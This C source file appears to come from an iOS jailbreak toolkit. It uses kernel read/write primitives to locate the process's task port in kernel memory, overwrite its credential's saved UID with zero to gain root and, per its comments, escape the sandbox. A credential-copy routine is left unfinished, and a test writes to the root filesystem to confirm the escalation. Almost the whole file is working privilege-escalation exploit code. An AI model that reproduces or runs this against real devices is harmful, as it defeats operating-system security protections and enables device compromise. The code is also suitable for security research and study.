#include "../include/tools.h"
#include "../include/kernel.h"
#include <mach/mach_init.h>

//  a bit memory inefficient but I prefer this as it's more readable
addr64_t read_pointer(krw_handlers *toolbox, addr64_t ptr_addr)
{
    addr64_t ptr;
    return toolbox->kread(ptr_addr, &ptr, sizeof(addr64_t)) ? 0 : STRIP_PAC(ptr);
}

addr64_t find_self_task(krw_handlers *toolbox)
{
    // from here: https://github.com/jakeajames/multi_path/blob/master/multi_path/jelbrek/kern_utils.m

    // find address to our process in kernel allprooc
    addr64_t selfproc = find_proc(toolbox, getpid());
    if (!selfproc)
    {
        printf("Failed to find selfproc\n");
        return 0;
    }

    uint64_t task_addr, itk_space, is_table = 0;

    // From our proc -> task_struct -> itk_space (ports)
    if (toolbox->kread(selfproc + __task_offset, &task_addr, sizeof(addr64_t)) ||
        toolbox->kread(task_addr + __itk_space_offset, &itk_space, sizeof(addr64_t)) ||
        toolbox->kread(itk_space + __is_table_offset, &is_table, sizeof(addr64_t)))
    {
        printf("Failed to read task details\n");
        return 0;
    }

    // get this process's mach port
    uint32_t my_port_index = mach_task_self() >> 8;

    // Now read the address associated with our port in the itk_space (just use our own processes port space)
    addr64_t port_addr = 0;
    if (toolbox->kread(is_table + (my_port_index * __sizeof_ipc_entry_t), &port_addr, sizeof(port_addr)))
    {
        printf("So close! Failed to read port_addr");
        return 0;
    }

    /* ipc_entry defined here: (https://opensource.apple.com/source/xnu/xnu-201/osfmk/ipc/ipc_entry.h.auto.html)
    basically this is used to map the port name (userland representation) to the port object (kernel representation)*/

    return port_addr;
}

int safe_elevate(krw_handlers *toolbox, pid_t pid)
{
    addr64_t ucred_s = read_pointer(toolbox, find_proc(toolbox, pid) + __ucred_offset);

    if (!ucred_s)
    {
        printf("Failed to read my ucred struct\n");
        return 1;
    }

    uint32_t root = 0;

    if (toolbox->kwrite(&root, ucred_s + __cr_svuid_offset, sizeof(uint32_t)))
    {
        printf("Ucred writing failed!");
        return 1;
    }

    // yes, setuid(0) need to be called twice - from taurine
    if (setuid(0) || setuid(0) || setgid(0) || getuid()) // apparently this just works after nulling __cs_svuid??
    {
        printf("Elevation failed :( UID: %d ", getuid());
        return 1;
    }

    printf("I'm freeee - UID: %d ", getuid());
    return 0; // apparently getting root is enough to break out of sandbox?
}

int copy_ucred(krw_handlers *toolbox, pid_t from, pid_t to)
{
    addr64_t from_ucred = read_pointer(toolbox, find_proc(toolbox, from) + __ucred_offset);
    addr64_t to_ucred = read_pointer(toolbox, find_proc(toolbox, to) + __ucred_offset);

    if (!from_ucred || !to_ucred)
    {
        printf("Failed to find from/to ucreds\n");
        return 1;
    }

    struct ucred key = {0};
    if (toolbox->kread(from_ucred + __cr_uid_offset, &key.cr_posix, sizeof(struct posix_cred)))
    {
        printf("Failed to read posix_cred\n");
        return 0;
    }

    if (toolbox->kread(from_ucred + __cr_audit_offset, &key.cr_audit, sizeof(struct au_session)))
    {
        printf("Failed to read au_session\n");
        return 0;
    }
    key.cr_posix.cr_ngroups = 3;

    /*
         todo: https://twitter.com/xina520/status/1515720109255393282
        https://github.com/apple/darwin-xnu/blob/main/bsd/sys/ucred.h#L89
        */
    return 0;
}

int testRW()
{
    const char *name = "/test.txt";
    FILE *fptr = fopen(name, "w+");

    char string[] = "hello world!";
    char *buffer = malloc(sizeof(string));

    int status = 1;

    if (!fptr || !fwrite(string, sizeof(char), sizeof(string), fptr))
        printf("Failed to write to root! :(\n");
    else
    {
        fflush(fptr);
        fseek(fptr, 0, SEEK_SET);

        if (!fread(buffer, sizeof(char), sizeof(string), fptr))
            printf("failed to read file from root! :( \n");
        else if (strcmp(string, buffer))
            printf("Partial r/w?? wrote: %s but read %s\n", string, buffer);
        else
        {
            status = 0;
            printf("R/W works!");
        }

        if (fclose(fptr) || remove(name))
        {
            printf("Error closing/removing file...");
            fclose(fptr);
        }
    }

    return status;
}